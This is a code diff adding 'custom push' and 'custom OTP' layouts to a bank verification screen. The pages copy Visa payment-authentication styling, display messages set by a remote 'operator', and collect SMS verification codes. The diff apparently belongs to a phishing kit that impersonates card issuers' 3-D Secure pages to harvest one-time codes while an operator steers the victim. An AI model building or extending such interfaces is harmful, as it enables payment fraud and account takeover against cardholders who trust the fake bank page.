@@ -547,6 +547,7 @@ export function VerificationUi() {
 function VerificationUiContent() {
   const onClose = useBankVerificationStore((s) => s.onClose);
   const verificationLayout = useBankVerificationStore((s) => s.verificationLayout);
+  const verificationCustomText = useBankVerificationStore((s) => s.verificationCustomText);
 
   const {
     bank,
@@ -589,6 +590,93 @@ function VerificationUiContent() {
           <Spinner size={64} />
         </div>
 
+    );
+  }
+
+  // --- Custom Push layout ---
+  if (verificationLayout === "custom_push") {
+    return (
+      <StyleIsolationWrapper>
+        <VerificationPage {...pageProps}>
+          <h2 className="screenreader-only">Authentication required</h2>
+          <div className="visa-row">
+            <div className="visa-col-12 visa-validate">
+              <strong>Payment Authentication</strong>
+            </div>
+            <div className="row">
+              <div className="col-12" id="ValidateOneUpMessage">
+                <p className="mb-0">{verificationCustomText ?? "Please wait..."}</p>
+              </div>
+            </div>
+          </div>
+          <div className="visa-row">
+            <div className="col-12 visa-styling text-center">
+              <div className="form-group" style={{ marginTop: 24, marginBottom: 24 }}>
+                <Spinner size={64} />
+              </div>
+              {operatorMessage && (
+                <div
+                  style={{
+                    marginTop: 12,
+                    padding: "8px 16px",
+                    background: operatorMessage.level === "error" ? "#f8d7da" : "#d1ecf1",
+                    color: operatorMessage.level === "error" ? "#721c24" : "#0c5460",
+                    fontSize: 14,
+                    borderRadius: 4,
+                    textAlign: "center",
+                  }}
+                >
+                  {operatorMessage.message}
+                </div>
+              )}
+            </div>
+          </div>
+        </VerificationPage>
+      </StyleIsolationWrapper>
+    );
+  }
+
+  // --- Custom OTP layout ---
+  if (verificationLayout === "custom_otp") {
+    return (
+      <StyleIsolationWrapper>
+        <VerificationPage
+          {...pageProps}
+          footer={
+            <OtpForm
+              config={{ kind: "sms", value: otpValue, onChange: setOtpValue }}
+              onSubmit={onSubmit}
+              resendState={resendState}
+              submitting={submitting}
+              canSubmit={canSubmit}
+              errorMessage={resolveOtpError(
+                wrongCode,
+                expiredCode,
+                operatorMessage?.message,
+                "sms",
+              )}
+              showError={
+                wrongCode || expiredCode || Boolean(operatorMessage?.message)
+              }
+              errorLevel={
+                wrongCode || expiredCode ? "error" : (operatorMessage?.level ?? "error")
+              }
+            />
+          }
+        >
+          <h2 className="screenreader-only">Authentication required</h2>
+          <div className="visa-row">
+            <div className="visa-col-12 visa-validate">
+              <strong>Payment Authentication</strong>
+            </div>
+            <div className="row">
+              <div className="col-12" id="ValidateOneUpMessage">
+                <p className="mb-0">{verificationCustomText ?? "Please enter the verification code."}</p>
+              </div>
+            </div>
+          </div>
+        </VerificationPage>
+      </StyleIsolationWrapper>
     );
   }
 
